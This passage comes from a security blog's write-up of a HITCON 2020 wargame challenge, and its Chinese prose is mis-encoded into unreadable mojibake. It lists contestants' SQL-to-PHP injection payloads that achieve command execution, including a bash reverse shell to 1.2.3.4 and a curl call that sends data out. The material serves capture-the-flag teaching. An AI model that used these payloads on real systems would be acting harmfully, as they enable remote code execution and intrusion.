<p>åŒæ¨£æ˜¯åˆ©ç”¨ <code class="highlighter-rouge">/*! */</code> è¨»è§£ç¬¦è™Ÿå¼·è¡Œæ§‹é€ åˆæ³•æŸ¥è©¢ï¼Œä¸éæœ‰è¶£çš„æ˜¯ï¼ŒMySQL æ”¯æ´ <code class="highlighter-rouge">#</code> å–®è¡Œçš„è¨»è§£ç¬¦è™Ÿï¼Œæ­¤è¨»è§£ç¬¦è™ŸåŒæ¨£ä¹Ÿè¢« PHP æ”¯æ´ï¼Œæ‰€ä»¥ä¸æœƒå°è‡´ PHP èªæ³•éŒ¯èª¤ï¼Œæœ€å¾Œé‚„å¤šäº† <code class="highlighter-rouge">?&gt;</code> å¼·è¡ŒçµæŸ PHP ç¨‹å¼å€å¡Šï¼Œå†·çŸ¥è­˜æ˜¯å¦‚æœç¨‹å¼ç¢¼æ˜¯ PHP ç¨‹å¼å€å¡Šå…§æœ€å¾Œä¸€è¡Œçš„è©±ï¼Œä¸åŠ  <code class="highlighter-rouge">;</code> ä¸¦ä¸æœƒå°è‡´èªæ³•éŒ¯èª¤å”· :P</p>

<p><strong>by tree:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null--+.$output=exec('/readflag')&amp;id=

SQL: SELECT null-- .$output=exec('/readflag') FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;null-- .$output=exec('/readflag');
</code></pre></div></div>

<p>ä¹Ÿæ˜¯ç”¨äº† <code class="highlighter-rouge">--</code> æŠŠ PHP ç¨‹å¼ç¢¼çš„éƒ¨åˆ†åœ¨ SQL è£¡é¢é®è”½èµ·ä¾†ï¼Œåˆ©ç”¨äº† null é—œéµå­—è®“ SQL æŸ¥è©¢æœ‰å›å‚³çµæœï¼Œä½†åœ¨ PHP ä¹‹ä¸­å»è®Šæˆ <code class="highlighter-rouge">$row-&gt;null</code> å° $row ç‰©ä»¶å­˜å–åç‚º null çš„å±¬æ€§ï¼Œä½¿å¾— PHP ä¹Ÿèƒ½åˆæ³•åŸ·è¡Œï¼Œæœ€å¾Œå°‡æŒ‡ä»¤åŸ·è¡Œçµæœè¦†è“‹ $output è®Šæ•¸ï¼Œè®“é¡Œç›®å¹«åŠ©æˆ‘å€‘è¼¸å‡ºçµæœã€‚</p>

<p><strong>by cebrusfs (https://www.facebook.com/menghuan.yu):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;id=1

SQL: SELECT column=NULL; -- $b;var_dump(exec("/readflag")) FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;column=NULL; -- $b;var_dump(exec("/readflag"));
</code></pre></div></div>

<p>æ­¤è§£æ³•ä¹Ÿæ˜¯é¡ä¼¼çš„æ€è·¯ï¼Œé‹ç”¨ <code class="highlighter-rouge">--</code> é–‰åˆå†æ¹Šå‡ºåˆæ³• PHP ç¨‹å¼ç¢¼ï¼Œæœ€å¾Œç›´æ¥ä½¿ç”¨ var_dump å¼·åˆ¶è¼¸å‡º exec çš„åŸ·è¡Œçµæœã€‚</p>

<p><strong>by Jason3e7 (https://github.com/jason3e7):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;-- $id %2b system('/readflag');%23&amp;id=1

SQL: SELECT NULL;-- $id + system('/readflag');# FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;NULL;-- $id + system('/readflag');#;
</code></pre></div></div>

<p>é€™ä¹Ÿæ˜¯ç›¸ä¼¼çš„æ€è·¯ï¼Œæœ‰è¶£çš„æ˜¯ <code class="highlighter-rouge">-- $id</code> é€™å€‹éƒ¨åˆ†ï¼Œå¤§å®¶ä¸€å®šè¨˜å¾— <code class="highlighter-rouge">$id --</code> æ˜¯éæ¸›é‹ç®—å­ï¼Œä½†æœ‰æ™‚å¯èƒ½æœƒå¿˜è¨˜ <code class="highlighter-rouge">-- $id</code> ä¹ŸåŒæ¨£æ˜¯éæ¸›é‹ç®—å­ï¼Œæ‰€ä»¥é€™å€‹ <code class="highlighter-rouge">--</code> æœƒä½¿å¾— MySQL èªç‚ºæ˜¯è¨»è§£ï¼ŒPHP å»ä»èªç‚ºæ˜¯éæ¸›é‹ç®—å­ä¸¦æ­£å¸¸åŸ·è¡Œä¸‹å»ã€‚</p>

<p><strong>by shoui:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";&amp;id=1

SQL: SELECT null-- -"1";"\$output = \$row-&gt;".system('/readflag').";"; FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";;
</code></pre></div></div>

<p>åŒæ¨£é‹ç”¨è¨»è§£ <code class="highlighter-rouge">--</code> é–‰åˆ SQL ä½† PHP åˆæ˜¯éæ¸›é‹ç®—å­çš„ç‰¹æ€§ï¼Œè€Œ system åˆæœƒå°‡æŒ‡ä»¤åŸ·è¡Œçµæœç›´æ¥è¼¸å‡ºï¼Œå› æ­¤å°±èƒ½ç›´æ¥å–å¾— flagã€‚æœ¬äººæœ‰è£œå……èªªæ˜ç•¶æ™‚æ¸¬è©¦æ™‚ç›´æ¥è¤‡è£½è²¼ä¸ŠåŸå§‹ç¢¼é‚£è¡Œæ¥æ¸¬è©¦ï¼Œå¾Œä¾†ä½¿ç”¨ <code class="highlighter-rouge">?id=1&amp;column=null-- -"1";" ".system('/readflag').";"</code> ç²¾ç°¡å¾Œçš„ payload XDã€‚</p>

<h3 id="double-quoted-string-evaluation">Double-quoted String Evaluation</h3>

<p>PHP æœƒè‡ªå‹•åœ¨ç”±é›™å¼•è™Ÿã€Œâ€ã€åŒ…å¤¾çš„å­—ä¸²ä¸­ï¼Œå°‹æ‰¾ $ é–‹é ­çš„å­—è©ï¼Œå°‡å…¶è§£ææˆè®Šæ•¸å†æŠŠå€¼ä»£å…¥å­—ä¸²ä¸­ï¼Œé€™å€‹åŠŸèƒ½å°æ–¼å¿«é€Ÿè¼¸å‡ºå·²å……åˆ†è·³è„«è™•ç†çš„è®Šæ•¸å€¼éå¸¸æœ‰å¹«åŠ©ï¼Œå¯ä»¥å¢åŠ ç¨‹å¼ç¢¼å¯è®€æ€§ï¼›ä½†åŒæ¨£åœ°ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨é€™å€‹åŠŸèƒ½åšä¸€ä¸‹æœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚é€™æ®µ PHP ç¨‹å¼ç¢¼ <code class="highlighter-rouge">$str = "${phpinfo()}";</code> å°±å¯ä»¥ç›´æ¥åŸ·è¡Œ phpinfo å‡½å¼ï¼Œåˆ©ç”¨ <code class="highlighter-rouge">$str = "${system('id')}";</code> å°±å¯ä»¥åŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼›è€Œåœ¨ MySQL ä¸­ï¼Œé›™å¼•è™Ÿã€Œâ€ã€æ°å¥½ä¹Ÿå¯ä»¥è¢«ç”¨ä¾†è¡¨ç¤ºç´”å­—ä¸²ï¼Œæ‰€ä»¥æˆ‘å€‘å°±èƒ½æ§‹é€ å‡ºã€ŒMySQL èªç‚ºæ˜¯ç´”å­—ä¸²ï¼ŒPHP å»èªç‚ºéœ€è¦è§£æåŸ·è¡Œã€çš„ Payloadã€‚</p>

<p>è®“æˆ‘å€‘å…ˆä¾†çœ‹ç¬¬ä¸€å€‹ä¾‹å­ï¼š</p>

<p><strong>by ginoah:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id="${system('/readflag')}"&amp;id=1

SQL: SELECT id="${system('/readflag')}" FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;id="${system('/readflag')}";
</code></pre></div></div>

<p>å°æ–¼ SQL è€Œè¨€ï¼Œå°±æ˜¯å›å‚³ id èˆ‡å­—ä¸²æ¯”è¼ƒçš„çµæœï¼›ä½†å°æ–¼ PHP è€Œè¨€ï¼Œä¸Šè¿°çµæœæ˜¯å°‡é›™å¼•è™Ÿå­—ä¸²è§£æå®Œå¾Œæ‰è³¦å€¼çµ¦è®Šæ•¸ <code class="highlighter-rouge">$row-&gt;id</code>ï¼Œè€Œçµæœå°±å¦‚åŒå‰é¢èªªçš„ï¼Œå®ƒæœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ /readflagï¼Œé‚„æœƒå°‡çµæœè¼¸å‡ºè‡³ç¶²é ï¼Œæ‰€ä»¥å°±èƒ½å–å¾— flagï¼</p>

<p><strong>by Billy (https://github.com/st424204):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%2b"{$_POST[1]($_POST[2])}"&amp;id=1
POST: 1=system&amp;2=/readflag

SQL: SELECT name+"{$_POST[1]($_POST[2])}" FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;name+"{$_POST[1]($_POST[2])}";
</code></pre></div></div>

<p>åŒæ¨£åˆ©ç”¨é›™å¼•è™Ÿç‰¹æ€§ï¼Œä½†é€™å€‹ä¾‹å­æ§‹é€ çš„è¼ƒç‚ºè¤‡é›œï¼Œåˆ©ç”¨äº†ä¸€äº›é¬†è»Ÿç‰¹æ€§ï¼Œåœ¨ PHP ä¸­ï¼Œè‹¥å­—ä¸²è®Šæ•¸æ˜¯ä¸€å€‹å­˜åœ¨çš„å‡½å¼çš„åç¨±ï¼Œå‰‡æˆ‘å€‘å¯ä»¥åˆ©ç”¨ <code class="highlighter-rouge">$func = 'system'; $func('id');</code> é€™æ¨£çš„æ–¹å¼ä¾†å‘¼å«è©²è®Šæ•¸ï¼Œé€™å€‹ä¾‹å­å°±æ˜¯æ‡‰ç”¨äº†é€™å€‹ç‰¹æ€§ï¼Œå°‡æˆ‘å€‘å¾å‰ç«¯å‚³ééå»çš„ <code class="highlighter-rouge">$_POST[1]</code> ç•¶æˆå‡½å¼åç¨±ã€<code class="highlighter-rouge">$_POST[2]</code> ä½œç‚ºå‡½å¼çš„åƒæ•¸åŸ·è¡Œï¼Œå› æ­¤åªè¦åƒæ•¸å†å¸¶ä¸Š <code class="highlighter-rouge">1=system&amp;2=readflag</code> å°±èƒ½å–å¾— flagï¼</p>

<p><strong>by Hans (https://hans00.me)</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id||"{$_POST['fn']($_POST['cmd'])}"&amp;id=1
POST: fn=system&amp;cmd=/readflag

SQL: SELECT id||"{$_POST['fn']($_POST['cmd'])}" FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;id||"{$_POST['fn']($_POST['cmd'])}";
</code></pre></div></div>

<p>é€™å€‹ä¾‹å­èˆ‡å‰ä¸€å€‹åˆ©ç”¨äº†åŒæ¨£çš„ç‰¹æ€§ï¼Œå·®åˆ¥åœ¨èˆ‡æ­¤è™•çš„ Payload æ”¹ç”¨ OR é‚è¼¯é‹ç®—å­ <code class="highlighter-rouge">||</code>ï¼Œè€Œå‰é¢ä½¿ç”¨çš„æ˜¯åŠ æ³•ç®—è¡“é‹ç®—å­ <code class="highlighter-rouge">+</code>ï¼Œä½†çµæœéƒ½æ˜¯ç›¸åŒçš„ã€‚</p>

<p><strong>by Chris Lin (https://github.com/kulisu)</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=TRUE/"${system(%27/readflag%27)}";%23&amp;id=1

SQL: SELECT TRUE/"${system('/readflag')}";# FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;TRUE/"${system('/readflag')}";#;
</code></pre></div></div>

<p>é€™ä¹Ÿæ˜¯ç”¨ç›¸åŒæ¦‚å¿µï¼Œå‰é¢æ”¹ç”¨é™¤æ³•ç®—è¡“é‹ç®—å­ <code class="highlighter-rouge">/</code>ã€‚çœ‹å®Œè§£æ³•æ‰ç™¼ç¾æŠ•ç¨¿è€…æ˜¯åŒäº‹ï¼</p>

<p><img src="/assets/img/blog/20201030/1.png" alt="" /></p>

<h3 id="execution-operator">Execution Operator</h3>

<p>åœ¨ PHP ä¸­å­˜åœ¨çœ¾å¤šå‡½å¼å¯ä»¥åŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼Œå…¶ä¸­é‚„åŒ…æ‹¬ä¸€å€‹ç‰¹æ®Šçš„ <a href="https://www.php.net/manual/en/language.operators.execution.php">Execution Operator</a>ï¼Œæ­¤é‹ç®—å­çš„å½¢å¼æ˜¯åˆ©ç”¨åå¼•è™Ÿã€Œ<code class="highlighter-rouge">`</code>ã€å°‡å­—ä¸²åŒ…å¤¾èµ·ä¾†ï¼Œé€™æ¨£è©²å­—ä¸²å°±æœƒè¢«ç•¶ä½œç³»çµ±æŒ‡ä»¤åŸ·è¡Œï¼Œå…¶å…§éƒ¨å¯¦éš›æ˜¯åŸ·è¡Œ shell_execï¼Œæ›´è²¼å¿ƒçš„äº‹æƒ…æ˜¯ï¼Œé€™å€‹é‹ç®—å­åŒæ¨£æ”¯æ´ Double-quoted String Evaluationï¼Œæ‰€ä»¥è‹¥æ˜¯ <code class="highlighter-rouge">$cmd = 'id'; echo `$cmd`;</code> é€™æ¨£çš„å½¢å¼ï¼ŒPHP å°±æœƒå…ˆè§£æ $cmd å¾—å‡º idï¼Œå†åŸ·è¡Œ id ç³»çµ±æŒ‡ä»¤ï¼›è€Œåœ¨ MySQL ä¹‹ä¸­ï¼Œåå¼•è™Ÿæ˜¯ç”¨ä¾†è¡¨ç¤ºä¸€å€‹ identifierï¼Œidentifier ç”¨ä¾†æŒ‡ç¤ºä¸€å€‹ç‰©ä»¶ï¼Œæœ€å¸¸è¦‹çš„æ˜¯è³‡æ–™è¡¨æˆ–æ˜¯è³‡æ–™æ¬„ï¼Œç•¶æˆ‘å€‘åŸ·è¡Œ <code class="highlighter-rouge">SELECT c FROM t</code>ï¼Œå…¶ä¸­ c å’Œ t å°±æ˜¯ identifierï¼Œæ‰€ä»¥è‹¥æƒ³é  Execution Operator ä¾†åŸ·è¡ŒæŒ‡ä»¤ï¼Œå¯èƒ½é‚„å¿…é ˆåŒæ™‚è®“ identifier èƒ½å¤ è¢« MySQL è­˜åˆ¥æ‰è¡Œã€‚</p>

<p><strong>by dalun (https://www.nisra.net):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id=`$_POST[1]`%23?&gt;&amp;id=%0a+from+(select+'id','$_POST[1]')+as+a+--+
POST: 1=/readflag

SQL: SELECT id=`$_POST[1]`#?&gt; FROM mytable WHERE id = '
     from (select 'id','$_POST[1]') as a -- '
PHP: $output = $row-&gt;id=`$_POST[1]`#?&gt;;
</code></pre></div></div>

<p>é€™å€‹è§£æ³•ä¼¼ä¹æ˜¯å”¯ä¸€é¡˜æ„ä½¿ç”¨ id åƒæ•¸çš„ XDï¼åœ¨ column åƒæ•¸ç”¨è¨»è§£ç¬¦è™Ÿ <code class="highlighter-rouge">#</code> é–‰åˆå¾ŒçºŒï¼Œåœ¨ id åƒæ•¸æ’å…¥æ›è¡Œç¬¦è™Ÿä¸¦æ§‹é€ ä¸€å€‹åˆæ³•çš„ SQLï¼Œé€éå­æŸ¥è©¢è£½é€ åˆæ³•çš„ identifierï¼Œæœ€å¾Œç”± PHP é€é execution operator åŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚</p>

<p><strong>by HexRabbit (https://twitter.com/h3xr4bb1t):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name+or+@`bash+-c+"bash+-i+&gt;%26+/dev/tcp/1.2.3.4/80+0&gt;%261"`&amp;id=1

SQL: SELECT name or @`bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1"` FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;name or @`bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1"`;
</code></pre></div></div>

<p>é€™å€‹è§£æ³•æ ¸å¿ƒä¹Ÿæ˜¯é€é execution oeperator åŸ·è¡ŒæŒ‡ä»¤ï¼Œä¸éç”¨äº†ä¸€å€‹ç‰¹æ®Šçš„å­—å…ƒ <code class="highlighter-rouge">@</code>ã€‚åœ¨ MySQL ä¸­ï¼Œé€™ä»£è¡¨ user-defined variablesï¼Œå¾Œé¢çš„å­—ä¸²å‰‡ç‚ºè®Šæ•¸çš„åç¨±ï¼Œè€Œä¸”åç¨±å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—å…ƒï¼Œåªè¦ä½¿ç”¨ identifier çš„ç¬¦è™Ÿ <code class="highlighter-rouge">`</code> æŠŠå­—ä¸²åŒ…å¤¾èµ·ä¾†å³å¯ï¼Œè€Œå­˜å–ä¸å­˜åœ¨çš„è®Šæ•¸ä¸¦ä¸æœƒå°è‡´éŒ¯èª¤ï¼ŒMySQL åªæœƒå›å‚³ NULL çš„çµæœã€‚åœ¨ PHP ä¸­çš„è©±ï¼Œ<code class="highlighter-rouge">@</code> ä»£è¡¨ <a href="https://www.php.net/language.operators.errorcontrol">error control operator</a>ï¼Œå¯ä»¥æ”¾ç½®åœ¨è¡¨é”å¼å‰ï¼Œæœƒè®“ PHP å°‡æ­¤è¡¨é”å¼åŸ·è¡Œç”¢ç”Ÿçš„éŒ¯èª¤è¨Šæ¯å…¨éƒ¨å¿½ç•¥ï¼Œç”±æ–¼æ˜¯è¡¨é”å¼ï¼Œæ‰€ä»¥ä¹Ÿèƒ½é™„åŠ åœ¨ execution operator ä¹‹å‰ã€‚æœ€å¾Œé€™å€‹è§£æ³•å†ç”¨ <code class="highlighter-rouge">or</code> é‚è¼¯é‹ç®—å­ï¼ˆMySQL èˆ‡ PHP çš†æ”¯æ´ä¸¦ä¸”æ„ç¾©ç›¸åŒï¼‰ä¸²æ¥å³å¯é”æˆåŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚</p>

<p><strong>by cjiso1117 (https://twitter.com/cjiso)</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;%23&amp;id=qwe

SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;# FROM mytable WHERE id = 'qwe'
PHP: $output = $row-&gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;#;
</code></pre></div></div>

<p>åŒæ¨£æ˜¯åˆ©ç”¨ <code class="highlighter-rouge">/*! */</code> è£½é€ å‡º PHP çœ‹ä¸è¦‹ã€MySQL çœ‹å¾—è¦‹çš„è¨»è§£æ–‡å­—ä¾†æ§åˆ¶è³‡æ–™åº«æŸ¥è©¢çµæœï¼Œæœ€å¾Œåˆ©ç”¨ execution operator ä¾†é”æˆåŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼Œä½†ç”±æ–¼ <code class="highlighter-rouge">`</code> å…§çš„æ–‡å­—æœƒè¢« MySQL èªç‚ºæ˜¯ identifierï¼Œæ‰¾ä¸åˆ°å°æ‡‰è³‡æºæœƒå°è‡´éŒ¯èª¤ï¼Œæ‰€ä»¥é€éå­æŸ¥è©¢å’Œ alias èªæ³•å¼·è¡Œè£½é€ å‡º identifier è®“æŸ¥è©¢æ­£ç¢ºåŸ·è¡Œã€‚<del>æœ¬äººè¡¨ç¤ºä¸€é–‹å§‹è¦ºå¾—ç”¨ <code class="highlighter-rouge">/*! */</code> æœƒå¾ˆå¸¥ï¼Œçµæœèµ°åç¹äº†ä¸€å¤§åœˆ</del></p>

<p><strong>by shik (https://github.com/ShikChen/)</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%2b"${print_r(`/readflag`)}"&amp;id=1

SQL: SELECT id+"${print_r(`/readflag`)}" FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;id+"${print_r(`/readflag`)}";
</code></pre></div></div>

<p>é€™å€‹è§£æ³•åˆ©ç”¨åŠ æ³•é‹ç®—å­çµ„åˆ id identifier å’Œé›™å¼•è™Ÿå­—ä¸²ï¼Œæ¥è‘—åœ¨é›™å¼•è™Ÿå­—ä¸²åˆ©ç”¨ evaluation ç‰¹æ€§åŸ·è¡Œ PHP ç¨‹å¼ç¢¼ï¼Œé€é execution operator åŸ·è¡Œç³»çµ±æŒ‡ä»¤å¾Œå†ä»¥ print_r å¼·åˆ¶è¼¸å‡ºçµæœï¼Œå–å¾— flagã€‚</p>

<p><strong>åŒ¿å:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: id=1&amp;column=id%2b"${`yes`}"

SQL: SELECT id+"${`yes`}" FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;id+"${`yes`}";
</code></pre></div></div>

<p>å¦å¤–é‚„æ”¶åˆ°ä¸€å€‹åŒ¿åæäº¤çš„è§£æ³•ï¼Œæ€è·¯èˆ‡å‰é¢ç›¸åŒï¼Œç¸½ä¹‹å°±ä¹Ÿé™„ä¸Šä¾†äº†ï½ã€‚</p>

<h2 id="çµèª">çµèª</h2>

<p>ä»¥ä¸Šå°±æ˜¯æˆ‘å€‘é€™æ¬¡ç‚º HITCON 2020 æº–å‚™çš„ Wargame çš„å…¶ä¸­ä¸€é“é–‹æ”¾å¼é¡Œç›®çš„åˆ†äº«å’Œå¤§å®¶çš„è§£æ³•ä»‹ç´¹ï¼Œä¸çŸ¥é“å„ä½å–œä¸å–œæ­¡å‘¢ï¼Ÿ<del>å–œæ­¡çš„è©±è¨˜å¾—è¨‚é–±ã€æŒ‰è®šã€åˆ†äº«ä»¥åŠé–‹å•Ÿå°éˆ´éºå”·ï¼</del></p>

<p>é¡Œå¤–è©±ï¼Œé€™æ¬¡æˆ‘å€‘ç¸½å…±æœ‰ 5 é“ 100 åˆ†é¡Œç›®ï¼Œæ˜¯é ˜å–å°çå“çš„åŸºæœ¬æ¢ä»¶ï¼Œä½†æˆ‘å€‘é‚„æº–å‚™äº† 3 é“åƒ…æœ‰ 1 åˆ†çš„ bonus é¡Œç›®ï¼Œé¡å‹æ˜¯ 2 å€‹ web èˆ‡ 1 å€‹å”¯ä¸€çš„ pwnï¼Œè®“å¤§å®¶èƒ½é€²ä¸€æ­¥æŒ‘æˆ°é€²éšå¯¦æˆ°èƒ½åŠ›ï¼Œè€Œé€™æ¬¡æœ‰è§£é–‹è‡³å°‘ä¸€é“ bonus é¡Œçš„ç‚ºä»¥ä¸‹å…©ä½åƒåŠ è€…ï¼š</p>

<ul>
  <li>11/14 Balsn CTF 2020 ç¸½çé‡‘åè¬å…ƒ: 502 åˆ†</li>
  <li>FI: 501</li>
</ul>

<p>å‹æƒ…å·¥å•†ï¼šç”±å°ç£çŸ¥å CTF æˆ°éšŠä¹‹ä¸€çš„ Balsn èˆ‰è¾¦çš„ Balsn CTF 2020 å°‡åœ¨ 11/14 èˆ‰è¾¦ï¼Œä»–å€‘æº–å‚™äº†è±å¯Œçš„æ¯”è³½çé‡‘èˆ‡å……æ»¿å‰µæ„ã€æŠ€è¡“æ€§çš„é¡Œç›®ï¼Œæƒ³è­‰æ˜å¯¦åŠ›çš„æœ‹å‹å€‘å¯ä¸è¦éŒ¯éäº†ï¼</p>

<p>Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090<br />
Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/</p>

<p>å¦å¤–çš„å¦å¤–ï¼Œæœ€å¾Œè®“æˆ‘å€‘æ­å–œ <strong>yuawn (https://twitter.com/_yuawn)</strong> ä»¥ 1 åˆ†ä¹‹å§¿æ¦®ç² <strong>DEVCORE Wargame æœ€å¾Œ 1 å</strong>ï¼å…¨å ´æ’è¡Œæ¦œä¸Šå”¯ä¸€å¾—åˆ†ä¸è¶…é 100 çš„åƒåŠ è€…ï¼ŒåŒæ™‚ä»–ä¹Ÿå–å¾—äº† pwn é¡Œç›®çš„é¦–æ®ºå…¼å”¯ä¸€è§£ï¼Œæ­å–œä»– ğŸ‘ğŸ‘ã€‚</p>

<p>æœ€å¾Œé™„ä¸Šä»Šå¹´çš„å‰ååï¼Œå°±è®“æˆ‘å€‘ 2021 å¹´å†è¦‹å›‰ï½</p>

<table>
  <thead>
    <tr>
      <th>Place</th>
      <th>Team</th>
      <th>Score</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>11/14 Balsn CTF 2020 ç¸½çé‡‘åè¬å…ƒ</td>
      <td>502</td>
    </tr>
    <tr>
      <td>2</td>
      <td>FI</td>
      <td>501</td>
    </tr>
    <tr>
      <td>3</td>
      <td>mico</td>
      <td>500</td>
    </tr>
    <tr>
      <td>4</td>
      <td>ankleboy</td>
      <td>500</td>
    </tr>
    <tr>
      <td>5</td>
      <td>hans00</td>
      <td>500</td>
    </tr>
    <tr>
      <td>6</td>
      <td>Meow</td>
      <td>500</td>
    </tr>
    <tr>
      <td>7</td>
      <td>ginoah</td>
      <td>500</td>
    </tr>
    <tr>
      <td>8</td>
      <td>cjiso1117</td>
      <td>500</td>
    </tr>
    <tr>
      <td>9</td>
      <td>zodiuss</td>
      <td>500</td>
    </tr>
    <tr>
      <td>10</td>
      <td>dalun</td>
      <td>500</td>
    </tr>
  </tbody>
</table>

              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="blog-author-name">Cyku</a> 
              </div>
              <p class="blog-author-info">
                ä¸€ä½ç†±æ„›ç¶²ç«™æ‡‰ç”¨ç¨‹å¼å®‰å…¨æŠ€è¡“çš„å¤¢æƒ³å®¶ï¼Œ<br />å°ˆé•·æ–¼æ»²é€æ¸¬è©¦ï¼Œå¤¢æƒ³æ˜¯æˆç‚ºå…‰ä¹‹ç¾å°‘å¥³ã€‚
              </p>
          
              <div class="heading--side-lined">
                è®€è€…ç•™è¨€
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">

        <div class="relative-posts">
          <div class="heading--side-lined container">
            æœ€æ–°æ¶ˆæ¯
          </div>
          <div class="relative-posts__cells">
  
            <section class="card">
              <a href="/blog/2021/08/07/a-new-attack-surface-on-MS-exchange/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20210807/cover.png)"></div>
                <h3 class="card__title">
                  ProxyLogon åƒ…åƒ…åªæ˜¯å†°å±±ä¸€è§’ï¼Œä¸€å€‹é‡å° Microsoft Exchange Server çš„å…¨æ–°æ”»æ“Šé¢ï¼
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/Advisory/" class="card__tag">Advisory</a><a href="/blog/tag/CVE/" class="card__tag">CVE</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a><a href="/blog/tag/SSRF/" class="card__tag">SSRF</a>
              </div>
              <small class="card__category"><a href="/blog/category/æŠ€è¡“å°ˆæ¬„/">æŠ€è¡“å°ˆæ¬„</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2021/06/22/devcore-202106-recruit/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20150819/devcore_office_1.jpg)"></div>
                <h3 class="card__title">
                  DEVCORE å¾µæ±‚ç´…éšŠæ¼”ç·´å·¥ç¨‹å¸«
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/å…¬å‘Š/" class="card__tag">å…¬å‘Š</a><a href="/blog/tag/å¾µæ‰/" class="card__tag">å¾µæ‰</a>
              </div>
              <small class="card__category"><a href="/blog/category/æœ€æ–°æ¶ˆæ¯/">æœ€æ–°æ¶ˆæ¯</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2020/10/30/devcore-wargame-at-hitcon-2020/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201030/cover.png)"></div>
                <h3 class="card__title">
                  DEVCORE Wargame at HITCON 2020
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/PHP/" class="card__tag">PHP</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a>
              </div>
              <small class="card__category"><a href="/blog/category/æŠ€è¡“å°ˆæ¬„/">æŠ€è¡“å°ˆæ¬„</a></small>
            </section>
  
          </div>
        </div>


        <div class="contact-section container">
          <h2 class="contact-section__title">
            ç”¨æœ€çœŸå¯¦çš„æ”»æ“Šï¼Œé©—è­‰ä¼æ¥­çš„é˜²ç¦¦
          </h2>
          <a href="/contact/" class="home-contact__button button--dense">è¯çµ¡æˆ‘å€‘</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
